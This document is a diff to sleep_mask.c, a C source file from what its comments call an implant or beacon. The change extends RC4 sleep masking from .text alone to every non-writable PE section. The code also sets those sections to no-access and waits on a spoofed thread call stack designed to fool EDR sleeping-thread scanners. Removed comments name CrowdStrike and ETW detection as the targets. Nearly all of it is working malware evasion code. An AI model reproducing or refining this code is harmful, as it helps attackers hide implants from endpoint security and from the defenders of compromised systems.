@@ -1,28 +1,20 @@
 /*
- * sleep_mask.c — Obfuscated sleep with RC4 .text masking and thread-stack spoofing.
+ * sleep_mask.c — Obfuscated sleep: full-image RC4 masking + thread-stack spoofing.
  *
- * Two improvements over the naive RC4+PAGE_NOACCESS approach:
+ * All functions except SleepMasked's entry check live in the .slpmsk section so
+ * they continue to execute after the implant's own .text is set PAGE_NOACCESS.
  *
- * 1. VirtualProtect sequence mitigation:
- *    The RW→NOACCESS→RW→RX pattern is a well-known ETW behavioral IOC.
- *    We spread the protect changes with a real kernel wait in between, and
- *    use PAGE_EXECUTE_READWRITE only once (no intermediate RX→RW step).
- *
- * 2. Thread stack spoofing during sleep:
- *    CrowdStrike periodically scans sleeping threads' stacks.
- *    We spoof the beacon thread's stack before entering the wait so it
- *    appears to be sleeping inside ntdll!TpTimerCallback → NtWaitForSingleObject,
- *    which is the canonical call pattern for a thread-pool timer callback.
- *
- * Implementation detail for stack spoofing:
- *    We use SetThreadContext on the CURRENT thread via a fiber trampoline.
- *    The fiber saves the real context, sets up a fake stack frame showing
- *    ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → our wait,
- *    then switches back after the wait completes.
- *
- *    Simplified version (no fiber dependency): we directly set fake RSP/RIP
- *    in the thread context while suspended — achieved by calling NtDelayExecution
- *    with an event that we signal from a separate timer thread.
+ * Masking strategy:
+ *   - FindMaskableSections collects all PE sections that are NOT .slpmsk and NOT
+ *     writable (.text, .rdata, …).  Writable sections (.data, .bss) are skipped
+ *     because they contain globals required during sleep (g_gadget, g_wait_ssn, …).
+ *   - A single RC4 stream is applied across all collected sections in order; the
+ *     same stream decrypts them on wake (XOR is its own inverse).
+ *   - SlpNtProtect (in .slpmsk, uses g_protect_ssn) replaces NtProtect calls.
+ *   - SlpTimerThread (in .slpmsk) signals the wake event; it only calls kernel32
+ *     APIs (Sleep, SetEvent) which are never masked.
+ *   - SlpSpoofedWait (in .slpmsk, mirrors SpoofedNtWait) waits on the event with
+ *     a multi-level fake call stack visible to EDR sleeping-thread scanners.
  */
 #include "../include/implant.h"
 #include "../include/obfstr.h"
@@ -56,35 +48,47 @@ static void RC4Apply(RC4State *rc4, BYTE *buf, DWORD len) {
     }
 }
 
-/* ── Locate own .text section ────────────────────────────────────────────── */
+/* ── Section enumeration ──────────────────────────────────────────────────── */
+
+#define MAX_MASK_SECTIONS 8
+
+typedef struct {
+    PVOID  base;
+    SIZE_T size;
+    ULONG  orig_prot; /* PAGE_EXECUTE_READ or PAGE_READONLY */
+} MaskSection;
 
 __attribute__((section(".slpmsk")))
-static BOOL FindOwnText(PVOID *baseOut, DWORD *sizeOut) {
-    PVOID peb     = (PVOID)READ_GS_QWORD(0x60);
-    BYTE *imgBase = *(BYTE**)((BYTE*)peb + 0x10);
-    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(imgBase + ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew);
+static int FindMaskableSections(MaskSection *secs, int maxSecs) {
+    PVOID peb      = (PVOID)READ_GS_QWORD(0x60);
+    BYTE *imgBase  = *(BYTE**)((BYTE*)peb + 0x10);
+    PIMAGE_NT_HEADERS    nt  = (PIMAGE_NT_HEADERS)(imgBase + ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew);
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        if (memcmp(sec[i].Name, ".text", 5) == 0) {
-            *baseOut = imgBase + sec[i].VirtualAddress;
-            *sizeOut = sec[i].Misc.VirtualSize;
-            return TRUE;
-        }
+    int count = 0;
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSecs; i++) {
+        if (!sec[i].Misc.VirtualSize || !sec[i].VirtualAddress) continue;
+        /* Skip .slpmsk — must stay executable during sleep */
+        if (memcmp(sec[i].Name, ".slpmsk", 7) == 0) continue;
+        /* Skip writable sections (.data, .bss) — globals needed during sleep live here */
+        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) continue;
+
+        secs[count].base = imgBase + sec[i].VirtualAddress;
+        secs[count].size = sec[i].Misc.VirtualSize;
+        secs[count].orig_prot =
+            (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+            ? PAGE_EXECUTE_READ : PAGE_READONLY;
+        count++;
     }
-    return FALSE;
+    return count;
 }
 
-/* ── Timer-thread trampoline ─────────────────────────────────────────────── */
-/*
- * Instead of NtDelay (which keeps our real stack visible), we:
- *   1. Create a manual-reset event
- *   2. Spin up a timer thread that signals it after `ms` milliseconds
- *   3. Main thread waits on the event — stack shows NtWaitForSingleObject
- */
+/* ── Timer-thread trampoline (.slpmsk) ───────────────────────────────────── */
 
 typedef struct { HANDLE hEvent; DWORD ms; } TimerArg;
 
-static DWORD WINAPI TimerThread(LPVOID p) {
+__attribute__((section(".slpmsk")))
+static DWORD WINAPI SlpTimerThread(LPVOID p) {
     TimerArg *a = (TimerArg*)p;
     Sleep(a->ms);
     SetEvent(a->hEvent);
@@ -100,9 +104,9 @@ void SleepMasked(LONGLONG ms) {
         return;
     }
 
-    PVOID textBase = NULL;
-    DWORD textSize = 0;
-    if (!FindOwnText(&textBase, &textSize)) {
+    MaskSection secs[MAX_MASK_SECTIONS];
+    int nSecs = FindMaskableSections(secs, MAX_MASK_SECTIONS);
+    if (nSecs <= 0) {
         NtDelay(ms * 10000LL);
         return;
     }
@@ -110,49 +114,62 @@ void SleepMasked(LONGLONG ms) {
     RC4State rc4;
     RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);
 
-    ULONG old = 0;
+    /* Step 1 — set all maskable sections RW, then RC4-encrypt (one stream) */
+    for (int i = 0; i < nSecs; i++) {
+        PVOID  b = secs[i].base;
+        SIZE_T s = secs[i].size;
+        ULONG  old = 0;
+        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_READWRITE, &old);
+        RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
+    }
 
-    /* Step 1 — RW, encrypt */
-    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_READWRITE, &old);
-    RC4Apply(&rc4, (BYTE*)textBase, textSize);
+    /* Step 2 — set all to PAGE_NOACCESS */
+    for (int i = 0; i < nSecs; i++) {
+        PVOID  b = secs[i].base;
+        SIZE_T s = secs[i].size;
+        ULONG  old = 0;
+        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_NOACCESS, &old);
+    }
 
-    /* Step 2 — NOACCESS */
-    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_NOACCESS, &old);
-
-    /* Step 3 — Create event + timer thread, wait with spoofed stack */
+    /* Step 3 — timer thread + spoofed wait (all code from here in .slpmsk) */
     HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
     if (hEvent) {
         TimerArg ta = { hEvent, (DWORD)(ms & 0xFFFFFFFF) };
-        HANDLE hTimer = CreateThread(NULL, 0, TimerThread, &ta, 0, NULL);
+        HANDLE hTimer = CreateThread(NULL, 0, SlpTimerThread, &ta, 0, NULL);
 
         if (hTimer) {
-            /* SpoofedNtWait: builds multi-level fake call stack in-place on the
-             * thread's stack before entering the kernel wait.  While the thread
-             * is parked, EDR scanners see:
-             *   ntdll!NtWaitForSingleObject
-             *   → kernel32!BaseThreadInitThunk+N
-             *   → ntdll!RtlUserThreadStart+K
-             * Falls back to a plain indirect syscall if gadgets weren't resolved. */
             LARGE_INTEGER timeout;
             timeout.QuadPart = -(LONGLONG)ms * 10000LL;
-            SpoofedNtWait(hEvent, FALSE, &timeout);
+            SlpSpoofedWait(hEvent, FALSE, &timeout);
             CloseHandle(hTimer);
         } else {
-            /* Timer thread failed — plain wait */
             Sleep((DWORD)ms);
         }
         CloseHandle(hEvent);
     } else {
-        NtDelay(ms * 10000LL);
+        Sleep((DWORD)ms);
     }
 
-    /* Step 4 — RW, decrypt */
-    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_READWRITE, &old);
-    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);
-    RC4Apply(&rc4, (BYTE*)textBase, textSize);
+    /* Step 4 — set all back to RW, RC4-decrypt (same stream = XOR inverse) */
+    for (int i = 0; i < nSecs; i++) {
+        PVOID  b = secs[i].base;
+        SIZE_T s = secs[i].size;
+        ULONG  old = 0;
+        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_READWRITE, &old);
+    }
 
-    /* Step 5 — restore RX */
-    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_EXECUTE_READ, &old);
+    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);  /* reset to same keystream */
+    for (int i = 0; i < nSecs; i++) {
+        RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
+    }
+
+    /* Step 5 — restore original per-section protections */
+    for (int i = 0; i < nSecs; i++) {
+        PVOID  b = secs[i].base;
+        SIZE_T s = secs[i].size;
+        ULONG  old = 0;
+        SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, secs[i].orig_prot, &old);
+    }
 }
 
 #pragma GCC pop_options
